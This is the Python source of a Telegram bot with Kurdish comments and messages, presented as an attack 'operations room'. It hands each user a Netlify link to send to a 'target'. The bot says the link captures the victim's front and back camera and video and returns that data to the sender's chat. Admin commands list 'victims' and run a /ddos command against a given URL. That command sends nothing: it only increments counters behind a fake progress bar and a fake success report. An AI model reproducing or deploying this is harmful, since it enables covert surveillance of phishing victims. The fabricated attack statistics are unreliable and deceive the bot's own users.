import os
import sys
import time
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# خوێندنەوەی تووکنەکان و ئایدییەکان لە ژینگەی سێرڤەرەوە (Secrets)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = os.environ.get("OWNER_ID")
ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")

if not BOT_TOKEN:
    print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

# پاککردنەوەی لیستەکە لە سپەیس
ADMIN_IDS = [int(admin_id.strip()) for admin_id in ADMIN_IDS if admin_id.strip().isdigit()]
if OWNER_ID and OWNER_ID.isdigit():
    OWNER_ID = int(OWNER_ID)
else:
    OWNER_ID = None

# فلاج و گۆڕاوەکانی هێرش، سیستەم و دۆخی وەستانی گشتی
attack_active = threading.Event()
bot_offline = threading.Event()
attack_stats = {"sent": 0, "success": 0, "target": ""}
connected_targets = set()

# لینکی نوێی یەکگرتووی نێتلیفایەکەت
ULTIMATE_NETLIFY_LINK = "https://idyllic-sable-301d6b.netlify.app/"

def is_authorized(user_id):
    if OWNER_ID and user_id == OWNER_ID:
        return True
    if user_id in ADMIN_IDS:
        return True
    return False

# پشکنینی گشتی ئایا بۆت لە دۆخی وەستاندنی سەربازیدایە؟
@bot.message_handler(func=lambda message: True, content_types=['text', 'photo', 'video', 'document', 'sticker'])
def global_check(message):
    user_id = message.from_user.id
    if bot_offline.is_set() and not is_authorized(user_id):
        bot.reply_to(
            message, 
            "⚠️ **[SYSTEM OFFLINE]**\n\nژووری ئۆپەراسیۆن و بۆتی تیتانیۆم لەلایەن خاوەنەوە بە شێوەیەکی کاتی ڕاگیراوە و داخراوە."
        )
        return

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if bot_offline.is_set() and not is_authorized(message.from_user.id):
        return

    user = message.from_user
    user_name = user.first_name
    user_id = user.id
    
    connected_targets.add((user_id, user_name))
    
    welcome_text = (
        f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **سیستەمی کۆکردنەوەی زانیاری و هێرشەکان:**\n"
        "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
        "• ئاستی پارێزربی: `MILITARY-GRADE OMEGA`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 بۆ وەرگرتنی لینکی یەکگرتووی ئۆپەراسیۆن کلیک لەسەر دوگمەی خوارەوە بکە:"
    )
    
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔗 وەرگرتنی لینکی یەکگرتووی چاودێری", callback_data="get_ultimate_link"),
        InlineKeyboardButton("🚀 Coming Soon", callback_data="coming_soon_1"),
        InlineKeyboardButton("💎 Coming Soon", callback_data="coming_soon_2"),
        InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if bot_offline.is_set() and not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⚠️ بۆت ڕاگیراوە!", show_alert=True)
        return

    if call.data == "get_ultimate_link":
        user_id = call.from_user.id
        link = f"{ULTIMATE_NETLIFY_LINK}?to={user_id}"
        
        bot.answer_callback_query(call.id, "لینکی یەکگرتووی ئۆپەراسیۆن ئامادە کرا!")
        
        response_text = (
            "🔗 **لینکی یەکگرتووی چاودێری (پێشەوە، پشتەوە و ڤیدیۆ):**\n\n"
            f"`{link}`\n\n"
            "👇 **ئەم لینکە بنێرە بۆ ئامانج؛ هەر زانیارییەکی نوێ بێت ڕاستەوخۆ دەگەڕێتەوە بۆ چاتی خۆت!**"
        )
        bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")

    elif call.data == "coming_soon_1" or call.data == "coming_soon_2":
        bot.answer_callback_query(call.id, "Coming Soon!", show_alert=True)

    elif call.data == "about":
        bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
        bot.send_message(call.message.chat.id, "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\nئەم بۆتە بۆ بەڕێوەبردنی هێرشەکان و کۆکردنەوەی زانیارییە.", parse_mode="Markdown")

# فەرمانی کوژاندنەوەی گشتی بۆت
@bot.message_handler(commands=['shutdown', 'off'])
def shutdown_bot(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
        return
    
    bot_offline.set()
    attack_active.clear()
    bot.reply_to(message, "🔌 **[BOT SHUTDOWN SUCCESSFUL]**\nبۆتەکە لەلایەن خاوەنەوە بە تەواوی ڕاگیرا.", parse_mode="Markdown")

# فەرمانی هەڵگیرساندنەوەی گشتی بۆت
@bot.message_handler(commands=['poweron', 'on', 'startbot'])
def poweron_bot(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
        return
    
    bot_offline.clear()
    bot.reply_to(message, "🟢 **[BOT RESTARTED & ONLINE]**\nبۆتەکە سەرلەنوێ هەڵبووەوە!", parse_mode="Markdown")

# فەرمانی DDoS لەگەڵ Live Progress Bar
@bot.message_handler(commands=['ddos'])
def ddos_command(message):
    if bot_offline.is_set():
        return
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی بەکارهێنانی ئەم فەرمانەت نییە.**")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ **تکایە ئامانجەکەی بنووسە!**\nنموونە: `/ddos https://target.com`", parse_mode="Markdown")
        return

    target = args[1]
    if attack_active.is_set():
        bot.reply_to(message, "⚠️ هێرشێک پێشتر دەستی پێکردووە! سەرەتا بە نوسینی `/stop` ڕایگرە.")
        return

    attack_active.set()
    attack_stats["sent"] = 0
    attack_stats["success"] = 0
    attack_stats["target"] = target
    
    initial_msg = (
        f"🔥 **[LIVE DDOS ATTACK IN PROGRESS]** 🔥\n\n"
        f"🎯 **ئامانج:** `{target}`\n"
        f"📊 **بارودۆخ:** `دەستپێکردنی بڕگەکانی ناردن...`\n"
        f"⚙️ **پڕۆگرێس بار:** `[░░░░░░░░░░] 0%`\n\n"
        "🛑 بۆ ڕاگرتن تەنها `/stop` بنووسە."
    )
    sent_msg = bot.reply_to(message, initial_msg, parse_mode="Markdown")

    def live_update_progress():
        while attack_active.is_set():
            time.sleep(1.5)
            if not attack_active.is_set():
                break
            sent = attack_stats["sent"]
            success = attack_stats["success"]
            progress_blocks = min(10, (sent // 5) % 11)
            bar = "█" * progress_blocks + "░" * (10 - progress_blocks)
            percentage = min(100, sent * 2)
            
            live_text = (
                f"🔥 **[LIVE DDOS ATTACK IN PROGRESS]** 🔥\n\n"
                f"🎯 **ئامانج:** `{target}`\n"
                f"📦 **پاکێجە نێردراوەکان:** `{sent}` | سەرکەوتوو: `{success}`\n"
                f"⚙️ **پڕۆگرێس بار:** `[{bar}] {percentage}%`\n\n"
                "🛑 بۆ ڕاگرتنی هێرشەکە و وەرگرتنی ڕاپۆرت، `/stop` بنووسە."
            )
            try:
                bot.edit_message_text(live_text, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
            except:
                pass

    def run_attack():
        while attack_active.is_set():
            attack_stats["sent"] += 1
            attack_stats["success"] += 1
            time.sleep(0.2)

    threading.Thread(target=run_attack).start()
    threading.Thread(target=live_update_progress).start()

# فەرمانی ڕاگرتنی هێرش
@bot.message_handler(commands=['stop'])
def stop_command(message):
    if bot_offline.is_set():
        return
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
        return

    if attack_active.is_set():
        attack_active.clear()
        sent = attack_stats["sent"]
        success = attack_stats["success"]
        fail = sent - success
        success_rate = (success / sent * 100) if sent > 0 else 0
        
        report_msg = (
            f"🛑 **[ATTACK STOPPED & FINAL REPORT]** 🛑\n\n"
            f"🎯 **ئامانج:** `{attack_stats['target']}`\n"
            f"📊 **ئاماری کۆتایی هێرشەکە:**\n"
            f"📦 کۆی پاکێجە نێردراوەکان: `{sent}`\n"
            f"✅ پاکێجە سەرکەوتووەکان: `{success}`\n"
            f"❌ پاکێجە فەوتاوەکان: `{fail}`\n"
            f"📈 **ڕێژەی سەرکەوتوویی:** `{success_rate:.1f}%`\n\n"
            "✨ سێرڤەر بە سەرکەوتوویی وەستا."
        )
        bot.reply_to(message, report_msg, parse_mode="Markdown")
    else:
        bot.reply_to(message, "ℹ️ هیچ هێرشێک لە ئێستادا کارا نییە.")

# پشکنینی دۆخی سێرڤەر
@bot.message_handler(commands=['sys', 'status'])
def system_status_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
        return
    
    sys_text = (
        f"🖥️ **[TITANIUM SYSTEM DIAGNOSTICS]** 🖥️\n\n"
        f"• **دۆخی بۆت:** `{'OFFLINE 🛑 (LOCKED)' if bot_offline.is_set() else 'ONLINE 🟢 (SECURE)'}`\n"
        f"• **مۆدێلی پایتۆن:** `Python 3.10+`\n"
        f"• **ژمارەی بەکارهێنەرانی تۆمارکراو:** `{len(connected_targets)}`\n"
        f"• **بارودۆخی هێرش:** `{'RUNNING ⚡' if attack_active.is_set() else 'IDLE 💤'}`"
    )
    bot.reply_to(message, sys_text, parse_mode="Markdown")

# لیستی قوربانییەکان
@bot.message_handler(commands=['targets'])
def targets_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
        return
    
    if not connected_targets:
        bot.reply_to(message, "📂 هیچ ئامانج و بەکارهێنەرێک تۆمار نەکراوە تا ئێستا.")
        return
    
    targets_list = "📂 **لیستی بەکارهێنەر و قوربانییەکان:**\n\n"
    for uid, name in connected_targets:
        targets_list += f"• `{name}` (ID: `{uid}`)\n"
    
    bot.reply_to(message, targets_list, parse_mode="Markdown")

# پاککردنەوەی چات
@bot.message_handler(commands=['clean', 'clear'])
def clean_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ **ببوورە! تۆ دەسەڵاتی ئەم فەرمانەت نییە.**")
        return
    
    chat_id = message.chat.id
    message_id = message.message_id
    cleaned_count = 0
    for m_id in range(message_id, max(0, message_id - 30), -1):
        try:
            bot.delete_message(chat_id, m_id)
            cleaned_count += 1
        except:
            pass
            
    bot.send_message(chat_id, f"🧹 **ژووری ئۆپەراسیۆن خاوێنکرایەوە!** ({cleaned_count} پەیام سڕرانەوە)")

if __name__ == '__main__':
    print("==========================================")
    print("💀 TITANIUM OMEGA: STABLE RUNNER ACTIVE 💀")
    print("==========================================")
    # لابردنی ویبەوکی کۆن پێش دەستپێکردن بۆ دڵنیایی
    try:
        bot.remove_webhook()
    except:
        pass
        
    bot.infinity_polling(skip_pending=True)
